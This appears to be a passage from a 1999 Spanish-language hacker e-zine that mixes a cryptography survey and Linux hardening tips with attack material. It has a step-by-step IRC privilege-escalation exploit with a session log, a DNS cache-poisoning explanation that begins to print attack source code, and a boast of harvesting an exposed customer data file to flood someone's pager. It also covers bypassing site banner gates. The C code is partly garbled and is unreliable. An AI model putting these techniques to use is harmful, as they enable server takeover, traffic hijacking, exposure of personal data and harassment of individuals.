  analisis echo por instancias comerciales y academicas principalmente.
  Asi el NIST  podra decidir que sistema reune los requisitos para ser
  utilizado en  los  proximos  20-30 a~os  como  estandar.  Existen 15
  candidatos que fueron aceptados en abril pasado y estos son: CAST-256
  de Entrust Technologies Inc. ,  CRYPTON de Future Systems, DEAL de R.
  Outerbridge y  L. Knudsen,  DFE de CNRS-ENS,  E2 de la NTT,  FROG de
  TecApro International, HPC de R. Schroeppel,  LOKI97 de L. Brown,  J.
  Pieprzyk y J Seberry,  MAGENTA de Deutsche Telekom, MARS de IBM, RC6
  de RSA,  RIJNDAEL de J. Daemen y V. Rijmen,  SAFER+ de  Cylink Corp.,
  SERPENT de R Anderson,  E Biham y L. Knudsen, TWOFISH de B. Shneier,
  J. Kelsey, D. Whiting, D. Wagner, C. Hall y N. Ferguson.

  En estos momentos se encuentra el proceso de discusion y analisis de 
  todos los sistemas,  sin  embargo  hay  opiniones se han inclinado a 
  afirmar que  es muy  poco tiempo el  que  se tiene de  analisis para
  decidir p or un  sistema  ciptografico  que sea  seguro  durante los
  proximos 20 a 30 a~os,  por lo  que se espera  que se  prolongue  el
  tiempo de decision y mientras se asuma un estandar interino que puede
  ser triple-DES.

  Al repasar  algunos  de los  candidatos  podemos observar que es muy 
  dificil tener definida una teoria general para  desarrollar sistemas 
  criptograficos de bloques, sin embargo existen ciertas tendencias en 
  el dise~o de estos. En seguida mencionamos tres ejemplos representa-
  tivos uno de USA que usa constantes magicas, el RC6, otro de Asia que
  usa cajas magicas, el CRYPTON, y el ultimo de Europa, MAGENTA, que no
  usa cosas magicas.
 
  Podemos tomar a RC6 como un modelo de los sistemas que usan una serie
  de operaciones  aplicada a los  bloques de entrada. El sistema RC6 se
  considera seguro de los ataques conocidos, principalmente el lineal y
  diferencial, no se conoce llaves debiles. Ademas tiene la flexibilidad
  en la longitud de parametros igual a RC5 y ha aprovechado la experiencia
  de este.

  Otro ejemplo lo es el sistema CRYPTON de Future Systems Inc., en Korea,
  ste sistema esta basado con el estilo de las S-Cajas, tiene influencia
  de SQUARE, es altamente paralelizado y aun no se conoce debilidad.

  El sistema MAGENTA  esta basado con  un estilo  diferente,  no existen
  constantes o cajas magicas, su principal funcionamiento se basa en una
  modificacion de la Transformada Rapida de Hadamard. Una primera version
  ha sido usada el Alemania por Deutsche Telekom desde 1990, al igual que
  todos los  candidatos  los analisis lineal  y diferencial no mejoran al
  criptoanalisis de fuerza bruta. Como ultimo comentario podemos decir que
  la criptografia  simetrica esta  actualmente  cambiando y se prepara el
  estilo de dise~o en los algoritmos que regira en los proximos 20-30 a~os.
             

  2   Criptografia Asimetrica

  La criptografia asimetrica o criptografia de llave publica se caracteriza
  por tener  dos  diferentes llaves,  una que encripta mensajes y otra que
  los desencripta, la llave que encripta  es publica, es decir,  cualquier
  usuario  del sistema  puede hacer  uso  de  ella, la  llave  con que  se
  desencripta es privada, es decir, es propiedad  exclusiva de un usuario.
  Desde que  fue inventada  este tipo  de criptografia en los a~os 70 , la
  mayor  deficiencia  con  que  cuenta es su lentitud  en comparacion a la
  criptografia de llave privada. A pesar de esto este tipo de criptografia
  es de gran seguridad y por lo tanto se usa conjuntamente con la simetrica
  para el intercambio de llaves y asi se resuelve completamente el problema
  de la transmision de informacion por canales inseguros.

  De  la  misma  manera  que la criptografia  simetrica,  se  han propuesto 
  diferentes formas de efectuar la critpogrfia antisemetrica, mejor conocida
  como criptografia de llave publica. Dos tendencias han sido las que en los
  ultimos 15 a~os  prevalecen,  los  sistemas  basados en el Problema de la
  Factorizacion  Entera PFE, y  los  basados en resolver  el  Problema  del
  Logaritmo  Discreto PLD.  De los  primeros el  sistema  RSA es  el  mayor
  representante y de los del segundo tipo los Criptosistemas con Curvas
  Elipticas CCE han ganado un gran respeto.

  El estado del sistema RSA, se encuentra en dificultades, ya que para que
  ofrezca una considerable seguridad la longitud de las llaves debe de ser
  de 1024 bits,  y en casos  de extrema seguridad, como lo es la Autoridad
  Certificadora las llaves se toman de 2048 bits,  lo que en algunos casos
  limita su implementacion. El PFE ha sido uno de los mas estudiados y por
  lo tanto ha adelantado grandes exitos, actualmente numeros de 512 bits se
  consideran inseguros y los de 768 estan por serlo, una simple estimacion,
  considera que las llaves de 1024 bits podran ser usados sin riesgo los
  proximos 15 a~os.
 
  Por otro  lado  los  CCE tienen  la  ventaja de  proporcionar  la  misma
  seguridad con una considerable  reduccion  de la longitud  de las llaves,
  por ejemplo los  CCE solo  requieren  llaves de 160 bits proporcionan la
  misma seguridad para el caso de llaves de 1024 bits de RSA.
 
  La menor  longitud de  las llaves  le permite  a  los  CCE  poder  ser 
  implementados en dispositivos  que tengan  limitaciones de memoria, de 
  velocidad etcetera .   Este  tipo  de  sistemas  tiene  sin embargo la 
  dificultad de penetrar a una gran cantidad de publico ya que la teoria
  de la cual  se  basa es  algo  dificil y requiere de  conocimientos de
  varias ramas de las matematicas. En el area comercial esto cuenta mucho,
  por lo que el sistema RSA tiene la mayor parte del mercado, a pesar de
  esto se ha podido ver que los centros academicos, comerciales financieros,
  de seguridad nacional y otros toman cada vez mas en cuenta los CCE.
 
  El centro  de la  investigacion  sobre  los  CCE  esta  basado  en  la 
  universidad de Waterloo,  que  organiza  frecuentemente  seminarios al 
  respecto, en el  ultimo el  ECC98, se  ofrecieron  los  mas  recientes
  reportes de investigacion sobre el tema.  En este seminario se reporto
  que  los CCE  definidos  sobre  los campos  GF(2^100), son inseguros.

  Respecto al sistema RSA los ultimos reportes se inclinan a 
  tratar de encontrar debilidades del tipo que pertenece la funcion de 
  encriptamiento de RSA c=m^e mod n, esta funcion es deterministica en 
  el sentido de que un mensaje m, con las mismas llaves va a un 
  mensaje encriptado unico c, esto crea ciertos problemas en algunas 
  implementaciones ya que con un numero considerable de informacion 
  puede ser roto el sistema, como en el protocolo SSL. Esto es posible 
  evitarlo si se utiliza funciones probabilisticas que haga imposible 
  realizar el ataque. Recientemente el estandar PKCS#1 v. 1.5 ha sido 
  actualizado para acercar a la funcion RSA a una funcion 
  probabilistica y asi evitar ataques del tipo de mensaje escogido, la 
  modificacion ha dado como resultado una nueva version del PKCS #1, 
  la version 2. La principal modificacion es agregar un el OAEP 
  Optimal Asymetric Encryption Padding que de algun modo confunde el 
  mensaje original de forma diferente cada vez que se encripta, y asi 
  el resultado simule una funcion probabilistica. 
             

  3   NTRU
  
  Como ya mencionamos las dos tendencias mas remarcadas en lo que se 
  refiere a sistemas criptograficos de llave publica son las que basan 
  su seguridad en el PFE y el PLD en algunos grupos muy especiales, 
  como el de puntos racionales de una curva eliptica. Sin embargo es 
  obvio que antes y despues de los sistemas RSA y CCE se han propuesto 
  varias formas diferentes de dise~ar sistemas criptograficos, aunque 
  la mayoria o son rotos, es decir, su seguridad es fragil o su 
  implementacion no es practica. El sistema NTRU dise~ado por 
  matematicos de la Universidad de Brown ha llamado la atencion por su 
  originalidad de dise~o, este sistema tiene una forma muy diferente a 
  los mencionados en 2, los parametros del sistema son una tercia de 
  numeros (N,p,q) y cuatro conjuntos A, B, C y D de polinomios de 
  grado N-1. Las operaciones de encriptamiento se efectuan en el 
  anillo de polinomios R=Z[X]/(X^N-1). En comparacion con RSA podemos 
  mencionar que para una seguridad minima, llaves de 768 bits en RSA, 
  los parametros en NTRU deben ser (N,p,q)=(167,3,128), la llave 
  privada de 530 bits y la publica de 1169 bits (las llaves son 
  polinomios). Para el caso de 1024 de RSA, NTRU debe tener a 
  (N,p,q)=(503,3,256), la llave privada de 1595 bits y la llave 
  publica de 1024 bits.

  Con relacion a la rapidez en implementacion, es de la misma 
  velocidad de encripcion, 3.2 veces mas rapido en la desencripcion y 
  5.3 veces mas rapido en la generacion de llaves que RSA-1024.
  Sin duda en el futuro habra otro tipo de sistemas que basen su 
  seguridad en problemas que aun no se han investigado y que por una 
  parte sean mas seguros que los actuales y reduzcan al minimo el 
  costo de implementacion.
 
  Otro problema que recientemente ha sido propuesto para el dise~o de 
  sistemas criptograficos es el basado en la dificultad del problema 
  de la reduccion de reticulas propuesto por O. Goldreich, S. 
  Goldwasser y S. Halevi.


  4   Otras Herramientas Criptograficas


  Hasta el momento solo hemos tratado de mencionar algunos reciente 
  resultados que han llamado la atencion en los ultimos a~os, seria 
  dificil de mencionar todos sin embargo existe una herramienta 
  criptografica que por su simplicidad de planteamiento y tambien la 
  simplicidad de las soluciones ha tenido gran impulso y ha ido de la 
  mano con el desarrollo de la criptografia moderna. 

  Supongamos que tenemos un secreto muy importante y de este dependen
  grandes decisiones, por ejemplo la clave con la cual se abre una 
  caja fuerte, se lanzan misiles al enemigo, o mas simplemente la 
  llave secreta de una autoridad certificadora. Esta clave debe de ser 
  protegida a lo maximo y es obvio que si recae toda la 
  responsabilidad de esta en una sola persona su integridad esta en 
  riesgo ya que depende en mucho solo del criterio de una persona. Una 
  forma de solucionar este problema es distribuir la responsabilidad 
  del secreto, para que de este modo sea minimo el riesgo de una mala 
  decision. La criptografia tiene varias alternativas para dar 
  solucion a este problema, una de ellas es compartir el secreto en n 
  partes y que solo con t  n, partes pueda ser reconstruido el 
  mensaje. Para este proposito existe un metodo debido a Shamir, 
  que en base a un polinomio de grado t-1 comparte el secreto y 
  por la interpolacion de Lagrange lo reconstruye. Este metodo no esta 
  basado en problemas como el PFE o el PLD asi no depende de la 
  supuesta intractabilidad de algun problema. Los ataques conocidos 
  tienen la misma complejidad que dado un punto sobre una recta 
  desconocida encontrar el otro punto que determine la recta. Este 
  sistema comprende parte de los que se han llamado sistemas limite 
  (n,t), y significa que con t-1 de partes no se puede obtener el 
  secreto, pero con t partes se obtiene facilmente, a t se le llama 
  limite.

  Estas mismas ideas fueron retomadas por Shamir y Naor para 
  crear lo que se ha llamado como criptografia visual, la idea se basa 
  en como el ojo humano distingue entre un punto blanco y un negro la 
  frontera de esto constituye el limite. Para formar un punto negro a 
  partir de uno blanco se agregan partes del punto obscuras que se 
  sobreponen, de tal forma que el ojo humano comienza a ver un gris, 
  hasta que con un considerable numero t de partes obscuras el ojo 
  humano ve ya un punto negro. De esta forma podemos escribir o 
  dibujar informacion compartida sobre un numero n de acetatos y solo 
  con t de ellos podremos reconstruir la informacion escondida. Este 
  tipo de criptografia seria muy adecuada para lugares donde es 
  imposible tener equipo de desencriptamiento, por ejemplo durante una 
  campa~a militar el la selva o en actividades donde no haya 
  computadoras.
            

  REFERENCIAS:
		
   -J. Angel, Introduccion a los Criptosistemas con Curvas Elipticas

   -FIPS 46, Estadares de Encriptacion de Datos, 1977, FIPS 46-1 1988,
    FIPS 46-2 1993
                   
	   
  Webs: www.raza-mexicana.org - www.teesa.com/ignition -
        www.digitalrebel.net

  Mail : alt3kx_H3z@hotmail.com
    

 >อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ<
 ฐฐฐฐฐฐฐฐฐฐฐฐฑฑฑฑฑฑฑฑฑฑฑฑฒฒฒฒฒฒฒฒฒฒฒฒฒฐฐฐฐฐฐฐฐฐฐฐฐฐฑฑฑฑฑฑฑฑฑฑฑฑฒฒฒฒฒฒฒฒฒฒฒฒฒ
 >อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ<

                   Consiguiendo Info de usuarios SkyCard
                                 Por Vlad

 El otro dia webeando (como siempre, pinche mania que tengo) haciendo uso de
 mi servicio de recuperacion de mensajes de SkyTel me di a la tarea de ver
 que pez con estos muchachos. Pues en general tienen un buen servidor, pero
 hay un detalle que me llamo mucho la atencion.

 Exite una forma para que te des de alta y te dan algunos mensajes extras
 (solo aplica en usuarios de tarjetas SkyCard) y te piden datos personales
 como tu nombre, direccion, etc, bueno, estos datos deberian de ser
 confidenciales, pero la neta es que no.

 La informacion que se genera de esta forma se almacena en un un archivo
 tipo texto que se puede bien leer desde INet XD.


                  http://www.skytel.com.mx/poll/o.file


 Los usos que se le pueden dar a este archivo son variados, yo por ejemplo
 como no me sabia el numero del PIN de un wey que me cae en la punta, pues
 busque su nombre y despues genere un programita que mando 50 mensajes a
 su radiolocalizador, como esta por tarjetas... pues llego al mensaje 32 y
 el resto regreso con el mensaje de que existia un problema con el PIN
 (je je probre wey me acabe su credito). Bueno raza ahi se los dejo como
 nota cultural.


 >อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ<
 ฐฐฐฐฐฐฐฐฐฐฐฐฑฑฑฑฑฑฑฑฑฑฑฑฒฒฒฒฒฒฒฒฒฒฒฒฒฐฐฐฐฐฐฐฐฐฐฐฐฐฑฑฑฑฑฑฑฑฑฑฑฑฒฒฒฒฒฒฒฒฒฒฒฒฒ
 >อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ<

                        B R I N C A R   B A N N E R S
                                 by SatMex


 Hola a continuacion quiero explicarles como no tener que picar en
 algunas paginas como www.relatoseroticos.com o asi. xDD


 Bueno pues empezemos miren no se si se han topado con paginas que
 para poder entrar a ver la info(nos enfocaremos a las fotos porno)
 necesitamos picar con el mouse los banners 1 o 2 o 3 o 4 veses para
 que nos dejen entrar esto es pa que ganen dinero los owners 
 pues que les pagen por promocionar banners.


 Pero nosotros podemos impedir (que ganen dinero xDD) mejor dicho
 no tener la necesidad de andar picando banners y perder tiempo.

 A continuacion esplicare un JAVA SCRIPT (solo lo que nos interesa)

 Este Javascript lo que hace es que tengames que tener que pigar
 clicks en links(banners por lo regular) y despues nos deja entrar
 a destino)


 <script language="Javascript">
 <!--

 // 
 // 
 //  Dont copy this src. 
 // w/o expressed written permission.

 function Get_Cookie(name) {
      var start = document.cookie.indexOf(name+"=");
      var len = start+name.length+1;
      if ((!start) && (name != document.cookie.substring(0,name.length))) return null;
      if (start == -1) return null;
      var end = document.cookie.indexOf(";",len);
      if (end == -1) end = document.cookie.length;
      return unescape(document.cookie.substring(len,end));
  }

  function Set_Cookie(name,value,expires,path,domain,secure) {
      document.cookie = name + "=" +escape(value) +
          ( (expires) ? ";expires=" + expires.toGMTString() : "") +
          ( (path) ? ";path=" + path : "") + 
          ( (domain) ? ";domain=" + domain : "") +
          ( (secure) ? ";secure" : "");
  }

  function See_Porn(clix) {
   if (clix < 2) { 
    alert("Solo tienes " + clix + " clicks. Necesitas 2 clicks para entrar.
    Por favor click en los DOS banners y luego intenta otravez. Gracias");
   } else {
    window.location = '/relatos/galeria.shtml';  //  <-------------.
                                                                   ณ
                                  ESTO ES LO QUE NOS INTERESA -----'


 // En este pedaso nos marca donde esta la pagina destino
 // mira lo que vamos a hacer si usamos internet explorer o netscape o
 // lynx ;) es dar la opcion VIEW SOURCE (ver fuente) y te mostrara este
 // pedazo y mas info en el notepad tons te vas a fijar lo que dice y lo
 // vas a poner  en la direccion:
 // http://www.paginaporno.com/relatos/galerias,shtml y asi vas a entrar
 // sin picar banners es un proceso muy sencillo


  }
 }

 function click0r() {
  var curclix = Get_Cookie('clix');
  if (curclix != 2) { 
   curclix = curclix - (-1);
   Set_Cookie('clix', curclix);
  }
 }

 >อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ<
 ฐฐฐฐฐฐฐฐฐฐฐฐฑฑฑฑฑฑฑฑฑฑฑฑฒฒฒฒฒฒฒฒฒฒฒฒฒฐฐฐฐฐฐฐฐฐฐฐฐฐฑฑฑฑฑฑฑฑฑฑฑฑฒฒฒฒฒฒฒฒฒฒฒฒฒ
 >อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ<

                       Tips de Seguridad en LiNUX

                     PabloJuan pablo_juan@yahoo.com
                Ningun derecho reservado, libre de fusilar

  Este  documento esta mas orientado a mantener la seguridad que a romperla
  a  si que si esperabas un documento de como entrar a un sistema busca  en
  otro  lado  :P,  todo esta probado en linux y puede  ser  aplicado  a  la
  mayoria de los unix existentes con pocos cambios.


  Lo primero que tienes que hacer es un analisis de que usas y que no usas,
  si  solo usas tu maquina localmente no tienes por que tener un el demonio
  de  telnet, y si tienes un servidor con varios usuarios el fingerd  puede
  ser bastante inseguro. Para quitar un servicio solo tienes que editar  el
  archivo  /etc/inetd.conf , poniendo un # al principio de lo  que  quieras
  quitar. Otros demonios no se manejan por medio del inetd, se ejecutan al
  momento de arrancar el sistema (como el httpd, etc), para quitar estos
  tienes que borrar el scrip que los arranca de /etc/rc.d/init.d/ .

  Ahora  veremos los TCP wrappers, esto es verificar la ip de  la  conexion
  entrante para ver si tiene acceso al servicio que solicita. En la mayoria
  de  las  distribuciones de linux ya estan configurados los  tcp  wrappers
  pero si no tenemos que meterlos a mano.
  telnet   stream   tcp nowait   root   in.telnetd

  Este es  un ejemplo de una linea que no usa tcp wrappers, (en inetd.conf)
  para  ponerlos solo aคadimos '/usr/sbin/tcpd', que es el programa  que se
  encarga  de comprovar las conexiones entrantes,  antes del in.telnetd nos
  quedaria de la siguiente forma :

  telnet   stream   tcp nowait   root   /usr/sbin/tcpd  in.telnetd

  Y  listo  solo  tienes  que  configurar los  archivos  /etc/hosts.deny  y
  /etc/hosts.allow en el primero estan las ip`s que no tienen acceso  y  en
  el  segundo estan las excepciones al hosts.deny, un repaso rapido de como
  configurar los archivos:

  ALL:ALL # Todos los servicios(TLS), todas las direcciones
  ALL:REMOTE # TLS, direcciones remotas
  ALL:LOCAL # TLS, direcciones locales
  ALL:10.10.10.10 # TLS, direccion 10.10.10.10
  ALL:10.10.10. # TLS, toda la subred 10.10.10.x
  sendmail:ALL # Solo el sendmail, todas las direcciones
  in.telnetd:LOCAL # Solo telnet, direcciones locales
  in.ftpd:120.23. # Solo ftp, toda la subred 120.23.x.x

  Puedes  combinarlas como quieras :P, un ejemplo util seria poner  ALL:ALL
  en  el  hosts.deny y ALL:LOCAL en el host.allow y asi todos los servicios
  solo podrian ser utilizados de forma local.


  Otra parte importante en la seguridad de un sistema son los log`s ya  que
  guardan informacion de todo lo que ocurre en el sistema (bueno casi  todo
  :P) el archivo que se encarga de configurar esto es /etc/syslog.conf, hay
  estan  configurados  todos  los  archivos  donde  se  guardan  los  logs,
  recomiendo cambiar los archivo que estan por defecto ya la mayoria de las
  personas  despues de aver entrado solo borra /var/log/ y piensa  que  con
  eso  nadie sabra que estuvo hay, pero como hemos cambiado la localizacion
  de  los logs tendremos suficiente material para meterlo al bote ;)  ,  si
  eres realmente paranoico puedes dirigir los logs un impresora con lo  que
  te aseguras que nadie podra borrarlos, otra cosa que puedes hacer y que a
  mi me a resultado muy util es dirigir los logs a una consola virtual,  si
  pones la siguiente linea en el syslog.conf podras ver los logs solo
  precionando alt+F8:
  *.info;mail.none;authpriv.none                          /dev/tty8

  Si administras un server  grande puede meter una entrada al cron para que
  haga un backup de los logs cada 30 min. o cada hora, y si haces que log`s
  se copien a una  particion  diferente  que solo se monte para guardar los
  logs sera muy dificil que alguien los encuentre, este scrip hace eso:


  #!/bin/sh
  # Hace un backup de los logs en una particion diferente
  # la monta, guarda los log`s y la desmonta
  # Modifica estas variables
  LOGSDIR="/var/log"    # Directorio donde estan los logs    #
  PARTICION="/dev/hda3" # La particion a montar              #
  TIPO="vfat"     # Tipo de la particion + info 'man mount'  #
  DIRMOUNT="/tmp/.mount"   # Directorio donde se va a montar #
  #-----------------------------------------------------------
  LOGFILE="$DIRMOUNT/LOG-`date +%k`.`date +%M`-`date +%B`-`date +%d`.tar"
  mount -t $TIPO $PARTICION $DIRMOUNT
  tar cf - $LOGSDIR > $LOGFILE
  gzip $LOGFILE
  umount $PARTICION
  # FiN xD


  Puedes  agregarle que genere logs propios con los usuarios  que estan  en
  el sistema, los procesos que estan corriendo y de las conecciones activas
  si no sabes hacer scrips sh mandame un mail y yo te lo mando  + completo.

  Un truco que confundira bastante a un intruso es cambiar el nombre de los
  comandos,  por  ejemplo  /bin/ls  lo  renombras  a  /bin/files, /bin/cd a
  /bin/cdir, los  que  recomiendo que cambien son: cd, cat, telnet, who, w,
  uname, su, gcc; o tal vez solo cambiar los permisos para que los usuarios
  normales no los puedan usar.


  Cuando accedes a tu sistema necesitas autentificarte con un  password, si
  alguien tiene tu password podra pasar por ti y acceder al sistema con tus
  privilegio, como  administrador preocupado por la seguridad de tu sistema
  deves  vereficar  periodicamente que las contrase~as de tus usuarios sean
  seguras, para lo que deves usar un crakeador de password puedes encontrar
  el mejor en http://www.false.com/security/john/ , incluye un programa que
  le envia un mail a todas los usuarios que tienen claves "debiles" util si
  tienes un sistema con varios usuarios.

  Y por ultimo unas recomendaciones rapidas
   -  Mantente  enterado de las vulnerabilidades que se van  descubriendo y
      aplica el parche que requiera.
   -  Si  no tienes  sombreado  el  /etc/passwd  usa la orden 'pwconv' para
      convertirlo, tambien usa 'grpconv' para sombrear los grupos.
   -  No  ejecutes nada que no sepas que es como root, algunas cosas pueden
      tener "regalitos" includios.
   -  No uses telnet usa SSH.
 
  Espero  que  todo  esto  le  sirva  a alguien,  si  tienes  dudas  puedes
  escribirme a pablo_juan@yahoo.com.

  Nota  de  ultima  hora :  He  encontrado  en  http://linux-es.uio.no/  un
  articulo bastante  parecido a  este escrito  por Michael  Jastremski solo
  quiero aclarar que este articulo no es una copia de ese articulo, todo lo
  que escribi esta basado en mi experiencia personal, y recomiendo  el otro
  articulo para su lectura si estas interesado en la seguridad.

 >อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ<
 ฐฐฐฐฐฐฐฐฐฐฐฐฑฑฑฑฑฑฑฑฑฑฑฑฒฒฒฒฒฒฒฒฒฒฒฒฒฐฐฐฐฐฐฐฐฐฐฐฐฐฑฑฑฑฑฑฑฑฑฑฑฑฒฒฒฒฒฒฒฒฒฒฒฒฒ
 >อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ<

                         [NOTIFICACION DE SEGURIDAD]
                             Raza Mexicana Team


 ---[ Sistema Afectado:     Version 2.8/Hybrid-6b96  
 ---[ Fecha de Anuncio:     31 de Agosto de 1999
 ---[ Creditos:             dr_fdisk^       
 ---[ Descripcion:

 El bug que tiene esta version del Hybrid IRC Server nos nada privilegios
 de IRCop.... es muy sencilla la forma de obtenerlo.. ahora paso a
 explicarles:

 ---[ Exploit :

 Como explotarlo ???
 
 1) Conectate a un server vulnerable
 2) Identifica tu nick
 3) Tipea esto: /mode tunick +O
 4) Tipea esto: /msg nickserv set oper ON
 5) Ahora si todo resulto podras agregar los modos xklm,etc....
 
 Sencillo no ????????

 -NickServ(NickServ@vulserv.com)- This nickname is owned by 
 someone else

 -NickServ(NickServ@vulserv.com)- If this is your nickname, type
 /msg NickServ IDENTIFY <password>

 -NickServ(NickServ@vulserv.com)- If you do not IDENTIFY within one
  minute, you will be disconnected

 - Mode change [+iw] for user dr_fdisk^
 [msg(nickserv)] identify mypassword

 -NickServ(NickServ@vulserv.com)- Password accepted - you are now recognized

 /mode dr_fdisk^ +O
 - Mode change [+o] for user dr_fdisk^

 [msg(nickserv)] set oper on
 -NickServ(NickServ@vulserv.com)- Toggled Operator Status [ON]

 /mode dr_fdisk^ +kx
 - Mode change [+kx] for user dr_fdisk^

 ฺฤฤฤฤฤ---ฤ--ฤฤ-ฤฤฤฤฤฤ---ฤ--ฤฤ-ฤฤฤฤฤฤฤฤฤ--- --  -
 | dr_fdisk^ (~stone@RCH2ppp-362.aol.com.mx) (Mexico)
 ณ ircname  : * I'm to lame to read BitchX.doc *
 ณ server   : irc.vulserv.com ([200.32.44.3] CTCS, Inc - San Jose, CA, USA)
 | operator : dr_fdisk^  (is NOT an IRC warrior) ----- OPERADOR heheehehehe
 : idle     : 0 hours 0 mins 30 secs (signon: Tue Aug 31 04:35:24 1999)
 [02:27am][dr_fdisk^(+ikwxO)] []

 Ahora con esto.. uds ya sabran que hacer....
 Por favor no le den doleres de cabeza a los IRCops ni admins...

 Bug found by dr_fdisk^ - Bug descubierto por dr_fdisk^
 Greetz to RaZa MeXiCaNa TeAm, Digital Rebel Net, fl3m team and others
 friends.

 >อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ<
 ฐฐฐฐฐฐฐฐฐฐฐฐฑฑฑฑฑฑฑฑฑฑฑฑฒฒฒฒฒฒฒฒฒฒฒฒฒฐฐฐฐฐฐฐฐฐฐฐฐฐฑฑฑฑฑฑฑฑฑฑฑฑฒฒฒฒฒฒฒฒฒฒฒฒฒ
 >อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ<
 
                  DNS explotable en informacion falseada

                               By alt3kx_H3z

 Web: www.raza-mexicana.org

 La razon del Cache en la resolucion de nombres de dominio tiene sentido,
 porke es un metodo de minimizar u optimizar el uso del ancho de banda en el
 internet.

 El problema del cache en el DNS es que cualquiera puede falsear la
 informacion enviada a un DNS, esperarse a que la informacion original
 caduke y aprovechar un apuntador equivocado para robar el 100% de los
 paquetes que se envian al dominio falseado. Obviamente puede redireccionar
 algunos paquetes para que el administrador original no se entere de la
 situacion. Y lo mas importante, un ladron de informacion (Hacker) en ningun
 momento habra ingresado a la maquina de la cual esta usurpando el nombre,
 ni aparecera en ninguna bitacora k00l =) .

                          Explicacion del Exploit

 Durante el Cacheo de la informacion de DNS, el Cache-only DNS (el DNS
 convencional tambien) conservara todo akello que se le envie como
 respuestas a las preguntas que el haga.

 La manera de explotar este defecto es trivial, por ejemplo, Una presona se
 conecto desde la 38.222.74.2 para revisar las paginas de Web de la empresa
 "big&hard.com.mx", y el servidor de web de esta empresa esta configurado
 para tratar de determinar el nombre de dominio de las conecciones hechas
 hacia el.

 El DNS que la big&hard utiliza es: 98.76.54.32 y la IP del servidor de Web
 de big&hard es: 123.45.67.89

 Entonces:

 1. 123.45.67.89 le envia a la 98.76.54.32 una pregunta por el Record
 2.74.222.38.in-addr.arpa PTR

 2. 98.76.54.32 no tiene informacion al respecto

 3. 98.76.54.32 pregunta y encuentra que los servidores 38.222.74.2 y
 38.22.74.10 son los servidores autoritarios de la red 74.22.38.in-addr.arpa

 4. entonces le pregunta a uno de estos por: 2.74.222.38.in-addr.arpa PTR

     Imaginen el resultado si las maquinas 38.222.74.2 y 38.22.74.10
     tienen la siguiente configuracion.

     @       IN      SOA     big&hard.com.mx. root.big&hard.com.mx.
          (9999999999 #<--Num. serie 9999999999 #><-Min. ttl

                      NS     big&hard.com.mx.

                      MX     10 big&hard.com.mx.

     localhost        A      127.0.0.1
     big&hard.com.mx. A      38.222.74.2
     mail             CNAME  big&hard.com.mx.

     Finalmente:

     98.76.54.32 le contesta a 123.45.67.89 que se conectaron al
     servidor de web desde big&hard.com.mx y guarda en su cache el
     registro.

     - ke pasa una vez expirado el registro original?


                                 Soluciones

                      Secure DNS (Propuestas en Inet)

     The Internet Software Consortium (www.isc.org), Actual poseedor
     del BIND y consciente del problema del cache del DNS, en base a
     la RFC 2065 (DNS Security Extensions) hizo un acuerdo con RSA
     para obtener una licencia gratuita de DNSSafe, que es una
     implementacion de RSA sobre el software de DNS y asi posibilitar
     la implementacion del DNSSEC, deacuerdo con la RFC.


          Ventajas
          El sistema ofrece un mecanismo de autentificacion
          adecuado, sin rekerir privacidad, lo que nos lleva a
          afirmar que los usuarios del internet no rekeriran
          nuevos programas para continuar trabajando con los DNS.

          Desventajas
          El Software de DNS, Bind y otros, requieren ser
          sustituidos por el software con las extensiones de
          seguridad apropiadas, los desarrolladores de programas
          que no estan basados en BIND No tienen mas que una
          ventana de 3 aคos con la licencia libre de RSA, despues
          deberan pagar por ella.

          Inconvenientes
          Dificil Implementacion ya ke mas del 90% de los
          servidores de nombres en el internet cachean la
          informacion y Nuestra seguridad depende de la
          actualizacion de otros.


                          Precauciones adicionales

          Al estar expuestos a la intervencion de la "mano del hombre"
       en la resolucion de nombres de dominio, ademas de otros trucos
                  para robarse las IP, es conveniente ke:

        * Usemos PGP

        * Conozcamos a nuestros vecinos Virtuales

        * Implementemos TCP Wrappers o medios de discriminar
          conexiones

        *  Ver el codigo fuente del ataque al DNS


              Codigo fuente del ataque completo por Rootshell


     #include <stdio.h
     #include <stdlib.h
     #include <stdarg.h
     #include <strings.h
     #include <errno.h
     #include <sys/socket.h
     #include <sys/types.h
     #include <netinet/in.h

     #define MAXBUFSIZE              64*1024

     #define DC_A            1
     #define DC_NS           2
     #define DC_CNAME        5
     #define DC_SOA          6
     #define DC_WKS          11
     #define DC_PTR          12
     #define DC_HINFO        13
     #define DC_MINFO        14
     #define DC_MX           15
     #define DC_TXT          16

     typedef struct {
       unsigned short id;

       unsigned char  rd:1;           /* recursion desired */
       unsigned char  tc:1;           /* truncated message */
       unsigned char  aa:1;           /* authoritive answer */
       unsigned char  opcode:4;       /* purpose of message */
       unsigned char  qr:1;           /* response flag */

       unsigned char  rcode:4;        /* response code */
       unsigned char  unused:2;       /* unused bits */
       unsigned char  pr:1;           /* primary server required (non standard) */
       unsigned char  ra:1;           /* recursion available */

       unsigned short qdcount;
       unsigned short ancount;
       unsigned short nscount;
       unsigned short arcount;
     } dnsheaderrec;

     typedef struct {
       unsigned short labellen;
       char label[256];
       unsigned short type;
       unsigned short class;
       unsigned long ttl;
       unsigned short buflen;
       char buf[256];
     } dnsrrrec;

     typedef struct {
       dnsheaderrec h;

       dnsrrrec qd[20];
       dnsrrrec an[20];
       dnsrrrec ns[20];
       dnsrrrec ar[20];
     } dnsrec;

     char *dnssprintflabel(char *s, char *buf, char *p);
     char *dnsaddlabel(char *p, char *label);
     void dnstxt2rr(dnsrrrec *rr, char *b);
     void dnsbuildpacket(dnsrec *dns, short qdcount, short ancount, short nscount,
     short arcount, ...);
     char *dnsaddbuf(char *p, void *buf, short len);
     int dnsmakerawpacket(dnsrec *dns, char *buf);

     unsigned long rev_long(l) unsigned long l;
     {
       unsigned long i = 0;
       int n = sizeof(i);
       while (n--) {
         i = (i << 8) | (l & 255); l = 8;
       }
       return i;
     }

     char *dnssprintflabel(char *s, char *buf, char *p)
     {
       unsigned short i,len;
       char *b=NULL;

